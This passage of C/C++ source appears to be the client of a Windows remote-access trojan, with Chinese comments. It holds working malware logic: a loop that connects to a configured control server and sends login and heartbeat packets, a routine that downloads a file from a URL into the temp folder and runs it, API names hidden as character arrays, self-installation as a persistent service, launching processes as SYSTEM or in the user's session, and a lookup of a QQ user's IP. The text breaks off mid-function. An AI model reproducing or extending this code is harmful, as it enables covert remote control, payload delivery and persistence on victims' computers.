	char	lpSubKey[512];
	HKEY	hKey;
	char	strTemp[1024];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	DWORD dwFileAttr = pGetFileAttributesA(lpFile);
	if (dwFileAttr == INVALID_FILE_ATTRIBUTES)
		return false;
	if (dwFileAttr & FILE_ATTRIBUTE_DIRECTORY)
		return pShellExecuteA(NULL, "open", lpFile, NULL, NULL, SW_SHOW) > (HINSTANCE)32;
	
	char	*lpExt = strrchr(lpFile, '.');
	if (lpExt == NULL)
		return false;
	
	char	szCurrentDirectory[MAX_PATH];
	memset(szCurrentDirectory, 0, sizeof(szCurrentDirectory));
	strncpy(szCurrentDirectory, lpFile, strrchr(lpFile, '\\') - lpFile);
	
	char szUserName[UNLEN+1];
	DWORD dwUserLen = UNLEN;
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
	{
		while (lpszUserSid == NULL)
			Sleep(100);
	}
	
	if (lpszUserSid != NULL)
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s_Classes\\%s", lpszUserSid, lpExt);
		if (pRegOpenKeyExA(HKEY_USERS, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
				return false;
		}
	}
	else if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
	{
		return false;
	}
	pRegQueryValueA(hKey, NULL, strTemp, &nSize);
	pRegCloseKey(hKey);
	
	if (lpszUserSid != NULL)
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s_Classes\\%s\\shell\\open\\command", lpszUserSid, strTemp);
		if (pRegOpenKeyExA(HKEY_USERS, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			memset(lpSubKey, 0, sizeof(lpSubKey));
			sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
			if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
				return false;
		}
	}
	else
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
		if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
			return false;
	}
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	pRegQueryValueA(hKey, NULL, strTemp, &nSize);
	pRegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = nShowCmd;
	BOOL	bFileExtMatch = stricmp(lpExt, ".exe") && stricmp(lpExt, ".bat") && stricmp(lpExt, ".com");
	DWORD	dwSessionId = 0;
	HANDLE	hTokenAcsi = NULL;
	
	if (stricmp(szUserName, "SYSTEM") == 0 && (bRunInAcsiUser ? TRUE : bFileExtMatch))
	{
		dwSessionId = pWTSGetActiveConsoleSessionId();
		if (dwSessionId == 0xFFFFFFFF)
			return false;
		if (!pWTSQueryUserToken(dwSessionId, &hTokenAcsi))
			return false;
	}
	
	if (hTokenAcsi == NULL) // 可执行文件(.exe .bat .com), 以SYSTEM权限运行
	{
		if (!pCreateProcessA(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, szCurrentDirectory, &si, &pi))
			return false;
	}
	else if (!pCreateProcessAsUserA(hTokenAcsi, NULL, strTemp, NULL, NULL, FALSE, 0, NULL, szCurrentDirectory, &si, &pi))
	{
		CloseHandle(hTokenAcsi);
		return false;
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	if (hTokenAcsi)
		CloseHandle(hTokenAcsi);
	return true;
}

DWORD WINAPI Loop_DownManager1(LPVOID lpParam)
{
	char zFiOL[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char yUfMS[]={'G','e','t','T','e','m','p','P','a','t','h','A','\0'};
	typedef DWORD (WINAPI *GetTempPathAT)(DWORD nBufferLength,LPSTR lpBuffer);
	GetTempPathAT pGetTempPathA=(GetTempPathAT)MyGetProcAddressA(zFiOL,yUfMS);
	
	char iOagR[]={'U','R','L','M','O','N','.','d','l','l','\0'};
	char JYvni[]={'U','R','L','D','o','w','n','l','o','a','d','T','o','F','i','l','e','A','\0'};
	typedef HRESULT (WINAPI *URLDownloadToFileAT)(LPUNKNOWN pCaller,LPCSTR szURL,LPCSTR szFileName,DWORD dwReserved,LPBINDSTATUSCALLBACK lpfnCB);
	URLDownloadToFileAT pURLDownloadToFileA=(URLDownloadToFileAT)MyGetProcAddressA(iOagR,JYvni);
	
	char xWiSd[]={'S','H','E','L','L','3','2','.','d','l','l','\0'};
	char zIksG[]={'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
	ShellExecuteAT pShellExecuteA=(ShellExecuteAT)MyGetProcAddressA(xWiSd,zIksG);
	
	char *lpUrl = (char *)lpParam;
	char *lpFileName = NULL;
	char szFilePath[MAX_PATH] = {0};
	char *lpFileExt = NULL;
	
	if (strlen(lpUrl) == 0)
	{
		free(lpUrl);
		return false;
	}
	
	lpFileName = strrchr(lpUrl, '/');
	if (lpFileName == NULL)
	{
		free(lpUrl);
		return false;
	}
	
	pGetTempPathA(sizeof(szFilePath), szFilePath);
	strcat(szFilePath, ++lpFileName);
	
// 	while (!InternetCheckConnection("http://www.baidu.com", FLAG_ICC_FORCE_CONNECTION, 0))
// 		Sleep(1000);
	
	DeleteUrlCacheEntry(lpUrl);
	HRESULT hr = pURLDownloadToFileA(NULL, lpUrl, szFilePath, 0, NULL);
	if (hr == S_OK)
	{
		if (!CheckFileExist(szFilePath))
		{
			free(lpUrl);
			return false; //文件下载成功，但是文件不存在，很可能被杀毒软件查杀
		}
	}
	else
	{
		free(lpUrl);
		return false;     //文件下载失败，请检查URL是否正确
	}
	free(lpUrl);
	
	lpFileExt = strrchr(szFilePath, '.');
	if (lpFileExt == NULL)
		return false;
	
	return OpenFile1(szFilePath, FALSE, stricmp(lpFileExt, ".bat") ? SW_SHOW : SW_HIDE);
	//return pShellExecuteA(NULL,"open",szFilePath,NULL,NULL,SW_SHOW) > (HINSTANCE)32;
}

char* TestQQToIP(char *szQQNum)
{
	char iOagR[]={'W','I','N','I','N','E','T','.','d','l','l','\0'};
	char JYvni[]={'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
	InternetOpenAT pInternetOpenA=(InternetOpenAT)MyGetProcAddressA(iOagR,JYvni);
	
	char dTyuB[]={'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0'};
	InternetOpenUrlAT pInternetOpenUrlA=(InternetOpenUrlAT)MyGetProcAddressA(iOagR,dTyuB);
	
	char lJvdZ[]={'H','t','t','p','Q','u','e','r','y','I','n','f','o','A','\0'};
	typedef BOOL (WINAPI *HttpQueryInfoAT)(HINTERNET hRequest,DWORD dwInfoLevel,LPVOID lpvBuffer,LPDWORD lpdwBufferLength,LPDWORD lpdwIndex);
	HttpQueryInfoAT pHttpQueryInfoA=(HttpQueryInfoAT)MyGetProcAddressA(iOagR,lJvdZ);
	
	char eTgDv[]={'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};
	InternetReadFileT pInternetReadFile=(InternetReadFileT)MyGetProcAddressA(iOagR,eTgDv);
	
	char aJopX[]={'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0'};
	InternetCloseHandleT pInternetCloseHandle=(InternetCloseHandleT)MyGetProcAddressA(iOagR,aJopX);
	
	char oMjlS[]={'h','t','t','p',':','/','/','u','s','e','r','s','.','q','z','o','n','e','.','q','q','.','c','o','m','/','f','c','g','-','b','i','n','/','c','g','i','_','g','e','t','_','p','o','r','t','r','a','i','t','.','f','c','g','?','u','i','n','s','=','%','s','\0'};
	char szUrl[1024];
	sprintf(szUrl, oMjlS, szQQNum);
	
	HINTERNET hInternet;
	HINTERNET hHttpFile;
	char szSizeBuffer[32];
	DWORD dwSizeBufferLen = sizeof(szSizeBuffer);
	char *szHttpBuffer;
	DWORD dwHttpBufferLen;
	DWORD dwBytesRead;
	char *ip_result = NULL;
	char *ip_start;
	char *ip_stop;
	
	hInternet = pInternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return NULL;
	hHttpFile = pInternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, NULL);
	if (hHttpFile == NULL)
	{
		pInternetCloseHandle(hInternet);
		return NULL;
	}
	if (!pHttpQueryInfoA(hHttpFile, HTTP_QUERY_CONTENT_LENGTH, szSizeBuffer, &dwSizeBufferLen, 0))
	{
		pInternetCloseHandle(hHttpFile);
		pInternetCloseHandle(hInternet);
		return NULL;
	}
	dwHttpBufferLen = atol(szSizeBuffer)+1;
	szHttpBuffer = new char[dwHttpBufferLen];
	memset(szHttpBuffer, 0, dwHttpBufferLen);
	if (!pInternetReadFile(hHttpFile, szHttpBuffer, dwHttpBufferLen, &dwBytesRead))
	{
		delete[] szHttpBuffer;
		pInternetCloseHandle(hHttpFile);
		pInternetCloseHandle(hInternet);
		return NULL;
	}
	pInternetCloseHandle(hHttpFile);
	pInternetCloseHandle(hInternet);
	ip_start = strstr(szHttpBuffer, "0,\"");
	ip_stop = strstr(szHttpBuffer, "\",0]");
	if (ip_start!=NULL && ip_stop!=NULL)
	{
		ip_start+=3;
		ip_result = new char[ip_stop-ip_start+1];
		memset(ip_result, 0, ip_stop-ip_start+1);
		strncpy(ip_result, ip_start, ip_stop-ip_start);
	}
	delete[] szHttpBuffer;
	return ip_result;
}

void Encrypt(char *szData, int Size)
{
	int i ;
	for ( i=0; i<Size; i++)
	{
		szData[i]-=51;
	}
}


int Random(int m, int n)
{
	int pos, dis;
	if(m == n)
	{
		return m;
	}
	else if(m > n)
	{
		pos = n;
		dis = m - n + 1;
		return rand() % dis + pos;
	}
	else
	{
		pos = m;
		dis = n - m + 1;
		return rand() % dis + pos;
	}
}


#include <shlwapi.h>
#include "wininet.h"
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"wininet.lib")
//DWORD WINAPI Login(LPVOID lpServiceName);
/*
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{

	
	// 发生异常，重新创建进程
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}*/




int main()
{









		// 互斥 上线地址:端口:服务名
	char	strMutex[100];
	wsprintfA(strMutex,"%s:%d:%s",modify_data.szDns1,modify_data.dwPort1,modify_data.SerName);
	HANDLE m_hMutex = CreateMutex(NULL, FALSE, strMutex);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ReleaseMutex(m_hMutex);
		CloseHandle(m_hMutex);
		return 0;
	}





	

	
	CloseHandle(MyCreateThread(NULL,0,LogoutOrShutdownRevive,NULL,0,NULL,true));
	lpszUserSid = NULL; //暂时设置为NULL, 等待系统登录后再获取
	char *lpDownRun = modify_data.szDownRun;
	if (lpDownRun != NULL)
		CloseHandle(MyCreateThread(NULL,0,Loop_DownManager1,lpDownRun,0,NULL,true));
	
	CloseHandle(MyCreateThread(NULL,0,GetActiveConsoleUserSid,(LPVOID)100,0,NULL,true));
	CloseHandle(MyCreateThread(NULL,0,SwapsPhysicalMemoryOut,(LPVOID)(1000*60),0,NULL,true));
	CloseHandle(MyCreateThread(NULL,0,AutoAdjustSessionId,(LPVOID)200,0,NULL,true));

    CClientSocket SocketClient;
	bool	bBreakError = false;
	char	lpszHost[256]={0};
    UINT  	dwPort = 0;
	while (1)
	{
		if (bBreakError != false)
		{
			Sleep(120000);
        //	Sleep(3000);
		}
		
		memset(lpszHost,0,256);
		lstrcpy(lpszHost,modify_data.szDns1);
		if(strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}
		dwPort = modify_data.dwPort1;

   

		DWORD dwTickCount = GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}

		DWORD upTickCount = GetTickCount()-dwTickCount;
		CKernelManager	manager(&SocketClient,
		                       	lpszHost,
		                       	dwPort);
	
		SocketClient.SetManagerCallBack(&manager);

		if(sendLoginInfo(NULL,&SocketClient,/*upTickCount*/GetTickCount() - dwTickCount,modify_data.szVersion) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}

		BYTE bToken = TOKEN_HEARTBEAT;
		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();
		int nRet = -1;
		int nCount = 0;
		do
		{
			// 每1分发送一次心跳包
			if ((GetTickCount() - dwTickCount) >= 1000 * Random(50,80) )
			{
				nRet = SocketClient.Send(&bToken, 1);
				Sleep(100);
				if (nRet == SOCKET_ERROR)
				{
					SocketClient.Disconnect();
					break;
				}
				else if (SocketClient.nHeartBeatCount == 0 && nCount == 3)
				{
					SocketClient.Disconnect();
				   	break;
				}
				nCount++;
				dwTickCount = GetTickCount();
			}

			dwIOCPEvent = WaitForSingleObject(
				          SocketClient.m_hEvent,
						  100);
			Sleep(400);
			if (SocketClient.nHeartBeatCount > 0)
				nCount = SocketClient.nHeartBeatCount = 0;
			
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);


		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
	}
	return 0;
}



static BOOL ServiceIsExist(LPCSTR lpServiceName)
{
	// 方法(1)
	SC_HANDLE schManager = NULL, schService = NULL;
	schManager = OpenSCManager(0, 0, SC_MANAGER_CONNECT);
	if (schManager == NULL)
		return FALSE;
	schService = OpenService(schManager, lpServiceName, STANDARD_RIGHTS_READ);
	if (schService == NULL)
	{
		CloseServiceHandle(schManager);
		return FALSE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(schManager);
	return TRUE;
	
	// 方法(2)
// 	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
// 	char KoX3m[]={'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
// 	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)MyGetProcAddressA(AjrFx,KoX3m);
// 	
// 	char jIomR[]={'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
// 	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)MyGetProcAddressA(AjrFx,jIomR);
// 	
// 	char fZkmT[]={'R','e','g','C','l','o','s','e','K','e','y','\0'};
// 	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)MyGetProcAddressA(AjrFx,fZkmT);
// 	
// 	char jLbYz[]={'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
// 	char SubKey[1024]={NULL};
// 	sprintf(SubKey,jLbYz,lpServiceName);
// 	
// 	HKEY hKey;
// 	if(pRegOpenKeyExA(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_QUERY_VALUE,&hKey) == ERROR_SUCCESS)
// 	{
// 		DWORD dwType,dwData,dwSize=sizeof(DWORD);
// 		if(pRegQueryValueExA(hKey,"Start",NULL,&dwType,(LPBYTE)&dwData,&dwSize) == ERROR_SUCCESS)
// 		{
// 			pRegCloseKey(hKey);
// 			return dwData==2?TRUE:FALSE;
// 		}
// 		else
// 		{
// 			pRegCloseKey(hKey);
// 			return FALSE;
// 		}
// 	}
// 	else return FALSE;
}






DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'S','e','t','E','v','e','n','t','\0'};
	SetEventT pSetEvent=(SetEventT)MyGetProcAddressA(iOagR,wSuTs);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char xTfkA[]={'S','e','t','S','e','r','v','i','c','e','S','t','a','t','u','s','\0'};
	typedef BOOL (WINAPI *SetServiceStatusT)(SERVICE_STATUS_HANDLE hServiceStatus,LPSERVICE_STATUS lpServiceStatus);
	SetServiceStatusT pSetServiceStatus=(SetServiceStatusT)MyGetProcAddressA(AjrFx,xTfkA);
	
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	GetNtVersionNumbers(OsVerInfoEx.dwMajorVersion,OsVerInfoEx.dwMinorVersion,OsVerInfoEx.dwBuildNumber);
	
	if (OsVerInfoEx.dwMajorVersion >= 6)
	{
		if (dwControl == SERVICE_CONTROL_SESSIONCHANGE && dwEventType == WTS_CONSOLE_CONNECT)
			pSetEvent(g_hEventRvive); // Vista以后系统(注销后), 连接控制台会话后, 才允许等待的服务继续运行
	}
	else
	{
		if (dwControl == SERVICE_CONTROL_SESSIONCHANGE && dwEventType == WTS_SESSION_LOGOFF)
			pSetEvent(g_hEventRvive); // Vista以前系统(注销后), 当用户注销会话后, 才允许等待的服务继续运行
	}
	if (dwControl == SERVICE_CONTROL_SHUTDOWN)
	{
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		pSetServiceStatus(hServiceStatus, &ServiceStatus);
		//exit(0);
		ExitProcess(0);
	}
	
	return NO_ERROR;
}

void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char KoX3m[]={'R','e','g','i','s','t','e','r','S','e','r','v','i','c','e','C','t','r','l','H','a','n','d','l','e','r','E','x','A','\0'};
	typedef SERVICE_STATUS_HANDLE (WINAPI *RegisterServiceCtrlHandlerExAT)(LPCSTR lpServiceName,LPHANDLER_FUNCTION_EX lpHandlerProc,LPVOID lpContext);
	RegisterServiceCtrlHandlerExAT pRegisterServiceCtrlHandlerExA=(RegisterServiceCtrlHandlerExAT)MyGetProcAddressA(AjrFx,KoX3m);
	
	char xTfkA[]={'S','e','t','S','e','r','v','i','c','e','S','t','a','t','u','s','\0'};
	typedef BOOL (WINAPI *SetServiceStatusT)(SERVICE_STATUS_HANDLE hServiceStatus,LPSERVICE_STATUS lpServiceStatus);
	SetServiceStatusT pSetServiceStatus=(SetServiceStatusT)MyGetProcAddressA(AjrFx,xTfkA);
	
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
	CreateEventAT pCreateEventA=(CreateEventAT)MyGetProcAddressA(iOagR,wSuTs);
	
	hServiceStatus = pRegisterServiceCtrlHandlerExA(modify_data.SerName,ServiceCtrlHandlerEx,NULL);
	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN|SERVICE_ACCEPT_SESSIONCHANGE;
	ServiceStatus.dwWin32ExitCode = NO_ERROR;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	pSetServiceStatus(hServiceStatus,&ServiceStatus);
	
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	GetNtVersionNumbers(OsVerInfoEx.dwMajorVersion,OsVerInfoEx.dwMinorVersion,OsVerInfoEx.dwBuildNumber);
	
	char CommandLine[1024],ServicePath[MAX_PATH];
	HANDLE hActiveSession = NULL;
	GetModuleFileName(NULL,ServicePath,MAX_PATH);
	sprintf(CommandLine,"%s -acsi",ServicePath);
	
	if (dwArgc == 2 && strcmp(lpszArgv[1],"-wait") == 0)
	{
		g_hEventRvive = pCreateEventA(NULL,TRUE,FALSE,NULL);
		WaitForSingleObject(g_hEventRvive,INFINITE);
		// Vista或Win7系统(注销后), 位于登录界面时, 以当前活动会话和系统服务模式双进程运行
		if (OsVerInfoEx.dwMajorVersion == 6 && (OsVerInfoEx.dwMinorVersion == 0 || OsVerInfoEx.dwMinorVersion == 1))
		{
			hActiveSession = RunInActiveSession(FALSE,CommandLine);
			CloseHandle(hActiveSession);
			AutoAdjustSessionId((LPVOID)200);
		}
		// Win7以后系统(注销后), 位于登录界面时, 以当前活动会话运行
		else if ((OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion >= 2) || OsVerInfoEx.dwMajorVersion > 6)
		{
			hActiveSession = RunInActiveSession(FALSE,CommandLine);
			CloseHandle(hActiveSession);
		}
		else // Vista以前系统(注销后), 位于登录界面时, 以当前活动会话运行
		{
			while (!FindWindow("#32770", "GINA Logon") && !FindWindow("#32770", "登录到 Windows"))
			{
				SwitchInputDesktop();
				Sleep(300);
			}
			hActiveSession = RunInActiveSession(FALSE,CommandLine);
			CloseHandle(hActiveSession);
		}
	}
	else if (dwArgc == 2 && strcmp(lpszArgv[1],"-rsvc") == 0)
	{
		hActiveSession = RunInActiveSession(FALSE,CommandLine);
		CloseHandle(hActiveSession);
		AutoAdjustSessionId((LPVOID)200);
	}
	else
	{
		hActiveSession = RunInActiveSession(FALSE,CommandLine);
		CloseHandle(hActiveSession);
	}
	
	ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	pSetServiceStatus(hServiceStatus,&ServiceStatus);
	//exit(0);
	ExitProcess(0);
}

void MarkTime(LPCSTR lpServiceName)
{
	char strSubKey[1024]={NULL};
	char JYvni08[]={'S','Y','S','T','E','M','\\','S','e','l','e','c','t','\0'};
	sprintf(strSubKey,JYvni08,lpServiceName);
	SYSTEMTIME st;
	GetLocalTime(&st);
	char sDate[MAX_PATH]={NULL};
	char JYvni06[]={'%','4','d','-','%','.','2','d','-','%','.','2','d',' ','%','.','2','d',':','%','.','2','d','\0'};
	sprintf(sDate, JYvni06, st.wYear,st.wMonth,st.wDay, st.wHour,st.wMinute);
	char JYvni04[]={'M','a','r','k','T','i','m','e','\0'};
	
	WriteRegEx(HKEY_LOCAL_MACHINE,strSubKey,JYvni04,REG_SZ,(char *)sDate,strlen(sDate),1);
}

void MyCreatDirector(LPCSTR lpPath)
{
	char LhTrc[]={'S','H','L','W','A','P','I','.','d','l','l','\0'};
	char Jdtjx[]={'P','a','t','h','F','i','l','e','E','x','i','s','t','s','A','\0'};
	typedef BOOL (WINAPI *PathFileExistsAT)(LPCSTR pszPath);
	PathFileExistsAT pPathFileExistsA=(PathFileExistsAT)MyGetProcAddressA(LhTrc,Jdtjx);
	
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char JYvni[]={'C','r','e','a','t','e','D','i','r','e','c','t','o','r','y','A','\0'};
	CreateDirectoryAT pCreateDirectoryA=(CreateDirectoryAT)MyGetProcAddressA(iOagR,JYvni);
	
	char	DirTemp[MAX_PATH]={NULL};
	size_t	nNewPathLen = 0;
	
	nNewPathLen = pMyfunction->my_strlen(lpPath);
	for (size_t i=0; i<nNewPathLen; i++)
	{
		if(lpPath[i]=='\\')
		{
			pMyfunction->my_strncpy(DirTemp,lpPath,i);
			if(!pPathFileExistsA(DirTemp))
			{
				pCreateDirectoryA(DirTemp,NULL);
			}
		}
	}
}

// void ServiceFileAddSize(LPCSTR lpServicePath)
// {
// 	if (modify_data.Dele_zd == 0) //安装时不增大
// 		return;
// 	
// 	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
// 	char JYvni[]={'C','r','e','a','t','e','F','i','l','e','A','\0'};
// 	CreateFileAT pCreateFileA=(CreateFileAT)MyGetProcAddressA(iOagR,JYvni);
// 	
// 	char xsFeo[]={'S','e','t','F','i','l','e','P','o','i','n','t','e','r','\0'};
// 	SetFilePointerT pSetFilePointer=(SetFilePointerT)MyGetProcAddressA(iOagR,xsFeo);
// 	
// 	char lPbGD[]={'G','e','t','F','i','l','e','S','i','z','e','\0'};
// 	GetFileSizeT pGetFileSize=(GetFileSizeT)MyGetProcAddressA(iOagR,lPbGD);
// 	
// 	char eTmjZ[]={'W','r','i','t','e','F','i','l','e','\0'};
// 	WriteFileT pWriteFile=(WriteFileT)MyGetProcAddressA(iOagR,eTmjZ);
// 	
// 	DWORD dwSize = modify_data.Dele_zd * 1024; //modify_data.Dele_zd=10 就是10M
// 	
// 	HANDLE hFile = pCreateFileA(lpServicePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
// 	if(hFile == INVALID_HANDLE_VALUE) //失败
// 		return;
// 	
// 	pSetFilePointer(hFile,0,NULL,FILE_END);
// 	DWORD dwFileSize = pGetFileSize(hFile,NULL);
// 	
// 	if((dwSize*1024) > dwFileSize) //判断文件是否过大 防止服务端程序多次点击运行
// 	{
// 		DWORD	dwBytesWritten=NULL;
// 		char	Buffer[1024]={NULL};
// 		
// 		for (DWORD n=0; n<dwSize; n++)
// 		{
// 			if(n%1024 == 0)
// 			{
// 				for (int x=0; x<1024; x++)
// 					Buffer[x]=(char)(pMyfunction->my_rand()+x)%255; //写入随机垃圾数据
// 			}
// 			pWriteFile(hFile,Buffer,1024,&dwBytesWritten,NULL);
// 		}
// 	}
// 	CloseHandle(hFile);
// }

static void ServiceInstall(LPCSTR lpServicePath,LPCSTR lpServiceName,LPCSTR lpDisplayName,LPCSTR lpDescription)
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char JYvni[]={'C','o','p','y','F','i','l','e','A','\0'};
	CopyFileAT pCopyFileA=(CopyFileAT)MyGetProcAddressA(iOagR,JYvni);
	
	char dTyuB[]={'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
	SetFileAttributesAT pSetFileAttributesA=(SetFileAttributesAT)MyGetProcAddressA(iOagR,dTyuB);
	
	char xFjkI[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char lJvdZ[]={'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
	OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)MyGetProcAddressA(xFjkI,lJvdZ);
	
	char eTgDv[]={'C','r','e','a','t','e','S','e','r','v','i','c','e','A','\0'};
	CreateServiceAT pCreateServiceA=(CreateServiceAT)MyGetProcAddressA(xFjkI,eTgDv);
	
	char aJopX[]={'L','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
	LockServiceDatabaseT pLockServiceDatabase=(LockServiceDatabaseT)MyGetProcAddressA(xFjkI,aJopX);
	
	char iJDgc[]={'C','h','a','n','g','e','S','e','r','v','i','c','e','C','o','n','f','i','g','2','A','\0'};
	ChangeServiceConfig2AT pChangeServiceConfig2A=(ChangeServiceConfig2AT)MyGetProcAddressA(xFjkI,iJDgc);
	
	char oGsR3[]={'U','n','l','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
	UnlockServiceDatabaseT pUnlockServiceDatabase=(UnlockServiceDatabaseT)MyGetProcAddressA(xFjkI,oGsR3);
	
	char yimXs[]={'O','p','e','n','S','e','r','v','i','c','e','A','\0'};
	OpenServiceAT pOpenServiceA=(OpenServiceAT)MyGetProcAddressA(xFjkI,yimXs);
	
	char f7UiP[]={'C','h','a','n','g','e','S','e','r','v','i','c','e','C','o','n','f','i','g','A','\0'};
	ChangeServiceConfigAT pChangeServiceConfigA=(ChangeServiceConfigAT)MyGetProcAddressA(xFjkI,f7UiP);
	
	char kUhXa[]={'S','t','a','r','t','S','e','r','v','i','c','e','A','\0'};
	StartServiceAT pStartServiceA=(StartServiceAT)MyGetProcAddressA(xFjkI,kUhXa);
	
	char tOjmD[]={'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
	CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)MyGetProcAddressA(xFjkI,tOjmD);
	
	char szInstallModule[MAX_PATH]={NULL};
	GetModuleFileName(NULL,szInstallModule,MAX_PATH); //用于获取程序本身路径
	
	if (strnicmp(szInstallModule,lpServicePath,strlen(lpServicePath)) != 0)
	{
		MyCreatDirector(lpServicePath);    //创建文件夹
		pCopyFileA(szInstallModule,lpServicePath,FALSE);
//		ServiceFileAddSize(lpServicePath); //文件自增大
		memset(szInstallModule,0,MAX_PATH);
		pMyfunction->my_strcpy(szInstallModule,(char *)lpServicePath);
		pSetFileAttributesA(lpServicePath,modify_data.FileAttribute); //放这里才有用(修改文件属性)
	}
	Sleep(50); char szAuto[]={' ','-','a','u','t','o','\0'};
	pMyfunction->my_strcat(szInstallModule,szAuto);
	
	SC_HANDLE schManager = NULL, schService = NULL;
	DWORD dwServiceType; OSVERSIONINFO OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&OsVerInfoEx);
